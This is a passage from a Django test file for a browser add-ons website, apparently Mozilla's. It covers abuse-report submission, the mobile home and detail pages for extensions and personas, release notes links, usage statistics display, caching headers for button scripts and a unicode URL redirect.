        shared_url = reverse('addons.detail', args=['a15663'])
        r = self.client.get(shared_url)
        doc = pq(r.content)
        assert doc("fieldset.abuse")

        # and now just test it works
        self.client.login(username='regular@mozilla.com', password='password')
        r = self.client.post(reverse('addons.abuse', args=['a15663']),
                             {'text': 'spammy'})
        self.assertRedirects(r, shared_url)
        eq_(len(mail.outbox), 1)
        assert 'spammy' in mail.outbox[0].body
        assert AbuseReport.objects.get(addon=15663)


class TestMobile(amo.tests.MobileTest, amo.tests.TestCase):
    fixtures = ['addons/featured', 'base/apps', 'base/addon_3615',
                'base/featured', 'bandwagon/featured_collections']


class TestMobileHome(TestMobile):

    def _test_addons(self):
        r = self.client.get('/', follow=True)
        eq_(r.status_code, 200)
        app, lang = r.context['APP'], r.context['LANG']
        featured, popular = r.context['featured'], r.context['popular']
        eq_(len(featured), 3)
        assert all(a.is_featured(app, lang) for a in featured)
        eq_(len(popular), 3)
        eq_([a.id for a in popular],
            [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
                                  reverse=True)])

    def test_addons(self):
        self._test_addons()


class TestMobileDetails(TestPersonas, TestMobile):
    fixtures = TestMobile.fixtures + ['base/featured', 'base/users']

    def setUp(self):
        super(TestMobileDetails, self).setUp()
        self.ext = Addon.objects.get(id=3615)
        self.url = reverse('addons.detail', args=[self.ext.slug])
        self.persona = Addon.objects.get(id=15679)
        self.create_addon_user(self.persona)
        self.persona_url = self.persona.get_url_path()

    def test_extension(self):
        r = self.client.get(self.url)
        eq_(r.status_code, 200)
        self.assertTemplateUsed(r, 'addons/mobile/details.html')

    def test_persona(self):
        r = self.client.get(self.persona_url, follow=True)
        eq_(r.status_code, 200)
        self.assertTemplateUsed(r, 'addons/mobile/persona_detail.html')
        assert 'review_form' not in r.context
        assert 'reviews' not in r.context
        assert 'get_replies' not in r.context

    def test_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        r = self.client.get(self.persona_url, follow=True)
        eq_(pq(r.content)('#more-artist .more-link').length, 1)

    def test_new_more_personas(self):
        other = addon_factory(type=amo.ADDON_PERSONA)
        self.create_addon_user(other)
        self.persona.persona.persona_id = 0
        self.persona.persona.save()
        r = self.client.get(self.persona_url, follow=True)
        eq_(pq(r.content)('#more-artist .more-link').length, 0)

    def test_persona_mobile_url(self):
        r = self.client.get('/en-US/mobile/addon/15679/')
        eq_(r.status_code, 200)

    def test_extension_release_notes(self):
        r = self.client.get(self.url)
        relnotes = pq(r.content)('.versions li:first-child > a')
        assert relnotes.text().startswith(self.ext.current_version.version), (
            'Version number missing')
        version_url = self.ext.current_version.get_url_path()
        eq_(relnotes.attr('href'), version_url)
        self.client.get(version_url, follow=True)
        eq_(r.status_code, 200)

    def test_extension_adu(self):
        doc = pq(self.client.get(self.url).content)('table')
        eq_(doc('.adu td').text(), numberfmt(self.ext.average_daily_users))
        self.ext.update(average_daily_users=0)
        doc = pq(self.client.get(self.url).content)('table')
        eq_(doc('.adu').length, 0)

    def test_extension_downloads(self):
        doc = pq(self.client.get(self.url).content)('table')
        eq_(doc('.downloads td').text(), numberfmt(self.ext.weekly_downloads))
        self.ext.update(weekly_downloads=0)
        doc = pq(self.client.get(self.url).content)('table')
        eq_(doc('.downloads').length, 0)

    def test_button_caching(self):
        """The button popups should be cached for a long time."""
        # Get the url from a real page so it includes the build id.
        client = test.Client()
        doc = pq(client.get('/', follow=True).content)
        js_url = reverse('addons.buttons.js')
        url_with_build = doc('script[src^="%s"]' % js_url).attr('src')

        response = client.get(url_with_build, follow=True)
        fmt = '%a, %d %b %Y %H:%M:%S GMT'
        expires = datetime.strptime(response['Expires'], fmt)
        assert (expires - datetime.now()).days >= 365

    def test_unicode_redirect(self):
        url = '/en-US/firefox/addon/2848?xx=\xc2\xbcwhscheck\xc2\xbe'
        response = test.Client().get(url)
        eq_(response.status_code, 301)
